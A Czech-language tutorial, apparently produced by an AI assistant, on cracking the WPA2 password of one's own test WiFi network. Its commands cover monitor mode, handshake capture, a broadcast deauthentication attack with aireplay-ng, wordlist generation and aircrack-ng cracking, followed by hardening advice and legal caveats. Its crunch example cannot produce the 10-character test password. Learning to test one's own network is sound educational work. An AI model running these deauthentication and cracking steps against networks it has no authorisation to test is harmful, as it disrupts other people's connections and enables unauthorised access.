# Podrobný průvodce testováním WiFi zabezpečení

## Co je to WiFi testování?
WiFi testování je proces kontroly zabezpečení bezdrátové sítě. Testujeme, jak snadné nebo obtížné je získat přístup k síti bez autorizace. Vše děláme na vlastní testovací síti, abychom se naučili, jak se bránit proti skutečným útokům.

## 1. Příprava testovacího prostředí

### 1.1 Potřebné vybavení
- **Raspberry Pi 5**: Malý počítač, který budeme používat jako testovací stanici.
  - Cena: cca 2000 Kč
  - Kde koupit: Alza, CZC, Mironet
  - Proč zrovna Pi 5: Má dost výkonu na testování

- **NESDR SMArTee v2**: SDR přijímač pro monitorování rádiových frekvencí.
  - Cena: cca 1500 Kč
  - Kde koupit: SDR-shop, Alza
  - K čemu je: Monitoruje rádiové signály (ne WiFi)

- **USB WiFi adapter (Alfa AWUS036ACH)**: Externí WiFi karta s podporou monitor módu.
  - Cena: cca 800 Kč
  - Kde koupit: Alza, CZC
  - Proč zrovna Alfa: Podporuje monitor mód a má dobré ovladače

- **Testovací router**: Router, který budeme testovat.
  - Můžete použít starý router
  - Nebo koupit levný router za cca 500 Kč
  - Proč starý: Abychom nepoškodili hlavní router

- **Testovací zařízení**: Telefon nebo notebook pro připojení k testovací síti.
  - Můžete použít starý telefon
  - Nebo notebook, který máte doma

- **Ethernet kabel**: Pro připojení Raspberry Pi k internetu.
  - Cena: cca 100 Kč
  - Kde koupit: Jakýkoliv obchod s elektronikou

### 1.2 Nastavení testovací sítě
```
SSID: Testovaci_Sit        # ESSID - název WiFi sítě
Heslo: test123456         # PSK - předem sdílený klíč
Šifrování: WPA2           # Standard zabezpečení WiFi
Kanál: 6 (2.4GHz)         # Frekvenční kanál WiFi
```

### 1.3 Izolace testovacího prostředí
- **Fyzicky oddělit testovací router**: 
  - Odpojte testovací router od hlavní sítě
  - Je to jako mít testovací dům vedle skutečného
  - Proč: Abychom nepoškodili hlavní síť

- **Vypnout WPS**: 
  - WPS (WiFi Protected Setup) je tlačítko na routeru
  - Je to jako mít klíč pod rohožkou
  - Proč: Je to bezpečnostní riziko

- **Vypnout UPnP**: 
  - UPnP (Universal Plug and Play) umožňuje automatické připojení
  - Je to jako nechat dveře otevřené
  - Proč: Může to být nebezpečné

- **Vypnout vzdálenou správu**: 
  - Zabrání přístupu k routeru z internetu
  - Je to jako zamknout zadní dveře
  - Proč: Chrání router před útoky z internetu

## Jak to celé funguje?
1. **Příprava**:
   - Máme testovací router s jednoduchým heslem (PSK)
   - Máme Raspberry Pi s WiFi adapterem v monitor módu
   - Vše je izolované od hlavní sítě

2. **Testování**:
   - Raspberry Pi se pokusí zachytit handshake (výměnu klíčů)
   - Zachytí BSSID (MAC adresu routeru)
   - Pokusí se cracknout heslo pomocí wordlistu

3. **Výsledek**:
   - Pokud se podaří heslo cracknout, víme, že je slabé
   - Můžeme pak vymyslet lepší zabezpečení
   - Naučíme se, jak se bránit

## Proč to dělat?
1. **Bezpečnost**: Naučíte se, jak chránit svou síť
2. **Vzdělávání**: Pochopíte, jak WiFi funguje
3. **Praxe**: Získáte praktické zkušenosti
4. **Zábava**: Je to jako luštění šifry

## Co potřebujete vědět před začátkem?
1. **Základní znalost Linuxu**: Jak spouštět příkazy
2. **Trpělivost**: Někdy to trvá déle
3. **Pozornost**: Sledujte, co děláte
4. **Odpovědnost**: Testujte jen vlastní síť

Chcete pokračovat s dalšími kroky nebo potřebujete něco vysvětlit podrobněji?

## 2. Instalace potřebných nástrojů

### 2.1 Aktualizace systému
```bash
sudo apt-get update
sudo apt-get upgrade
```

### 2.2 Instalace základních nástrojů
```bash
sudo apt-get install aircrack-ng wireshark tshark
```

### 2.3 Instalace dalších užitečných nástrojů
```bash
sudo apt-get install hcxtools hcxdumptool
```

## 3. Nastavení monitor módu

### 3.1 Zjištění názvu WiFi rozhraní
```bash
iwconfig
```
Výstup bude vypadat přibližně takto:
```
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

### 3.2 Vypnutí WiFi rozhraní
```bash
sudo ifconfig wlan0 down
```

### 3.3 Nastavení monitor módu
```bash
sudo iwconfig wlan0 mode monitor
```

### 3.4 Zapnutí rozhraní
```bash
sudo ifconfig wlan0 up
```

### 3.5 Ověření nastavení
```bash
iwconfig
```
Výstup by měl obsahovat:
```
Mode:Monitor
```

## 4. Skenování sítí

### 4.1 Spuštění skenování
```bash
sudo airodump-ng wlan0
```

### 4.2 Interpretace výstupu
```
BSSID              PWR  Beacons    #Data  #/s  CH  MB   ENC  CIPHER AUTH ESSID
00:11:22:33:44:55  -64  100        50     2    6   54   WPA2 CCMP  PSK  Testovaci_Sit
```

Vysvětlení sloupců:
- BSSID: MAC adresa routeru
- PWR: Síla signálu
- Beacons: Počet beacon paketů
- #Data: Počet zachycených datových paketů
- CH: Kanál
- MB: Maximální rychlost
- ENC: Typ šifrování
- CIPHER: Šifrovací algoritmus
- AUTH: Typ autentizace
- ESSID: Název sítě

## 5. Zachytávání handshake

### 5.1 Spuštění zachytávání
```bash
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0
```

Parametry:
- -c 6: Kanál 6
- --bssid: MAC adresa routeru
- -w handshake: Název výstupního souboru

### 5.2 Deauth útok pro získání handshake
```bash
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0
```

Parametry:
- -0: Deauth útok
- 1: Počet deauth paketů
- -a: MAC adresa routeru
- -c: MAC adresa klienta (FF:FF:FF:FF:FF:FF pro broadcast)

### 5.3 Ověření zachyceného handshake
```bash
sudo aircrack-ng handshake-01.cap
```

## 6. Vytvoření wordlistu

### 6.1 Instalace nástroje pro generování wordlistu
```bash
sudo apt-get install crunch
```

### 6.2 Generování wordlistu
```bash
crunch 8 8 -t @@@@@@@@ -o wordlist.txt
```

Parametry:
- 8 8: Minimální a maximální délka hesla
- -t @@@@@@@@: Šablona (8 znaků)
- -o wordlist.txt: Výstupní soubor

### 6.3 Vytvoření vlastního wordlistu
```bash
echo "test123456" >> wordlist.txt
echo "password123" >> wordlist.txt
echo "qwerty123" >> wordlist.txt
```

## 7. Crackování hesla

### 7.1 Spuštění crackování
```bash
sudo aircrack-ng -w wordlist.txt handshake-01.cap
```

### 7.2 Interpretace výstupu
```
                               Aircrack-ng 1.6

      [00:00:00] 3/3 keys tested (100.00%)

      KEY FOUND! [ test123456 ]

      Master Key     : 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00
      Transient Key  : 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00
      EAPOL HMAC     : 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00
```

## 8. Analýza výsledků

### 8.1 Dokumentace testu
```
Datum: [datum]
Čas: [čas]
Testovaná síť: Testovaci_Sit
BSSID: 00:11:22:33:44:55
Kanál: 6
Šifrování: WPA2
Doba crackování: [čas]
Použitý wordlist: wordlist.txt
Nalezené heslo: test123456
```

### 8.2 Doporučení pro zabezpečení
1. Používat delší hesla
2. Kombinovat různé typy znaků
3. Pravidelně měnit hesla
4. Vypnout WPS
5. Používat silnější šifrování

## 9. Bezpečnostní opatření

### 9.1 Před testem
- Zálohovat konfiguraci routeru
- Dokumentovat počáteční stav
- Připravit plán obnovy

### 9.2 Během testu
- Sledovat systémové zdroje
- Dokumentovat všechny kroky
- Mít připravený plán B

### 9.3 Po testu
- Obnovit původní konfiguraci
- Smazat testovací data
- Dokumentovat výsledky
- Navrhnout vylepšení

## 10. Legální aspekty

### 10.1 Co je povoleno
- Testování vlastních sítí
- Testování vlastních zařízení
- Dokumentace testů
- Implementace vylepšení

### 10.2 Co není povoleno
- Testování cizích sítí
- Zachytávání cizí komunikace
- Šíření citlivých informací
- Porušování soukromí

## 11. Troubleshooting

### 11.1 Časté problémy
1. **Monitor mód se nespustí**
   - Zkontrolovat kompatibilitu ovladačů
   - Zkusit jiné rozhraní
   - Aktualizovat ovladače

2. **Handshake se nezachytí**
   - Zkontrolovat sílu signálu
   - Zkusit jiný kanál
   - Upravit počet deauth paketů

3. **Crackování nefunguje**
   - Zkontrolovat wordlist
   - Ověřit handshake
   - Zkusit jiný nástroj

### 11.2 Řešení problémů
1. **Logy a diagnostika**
   ```bash
   dmesg | grep wlan0
   iwconfig wlan0
   ```

2. **Testování připojení**
   ```bash
   ping 8.8.8.8
   iwlist wlan0 scan
   ```

## 12. Další kroky

### 12.1 Vylepšení zabezpečení
1. Implementace silnějších hesel
2. Vypnutí zranitelných služeb
3. Aktualizace firmwaru
4. Monitoring sítě

### 12.2 Pokročilé testy
1. Testování WPS
2. Analýza provozu
3. Detekce útoků
4. Penetrační testy

### 12.3 Dokumentace a reporting
1. Vytvoření reportu
2. Dokumentace zjištění
3. Navržení vylepšení
4. Plán implementace 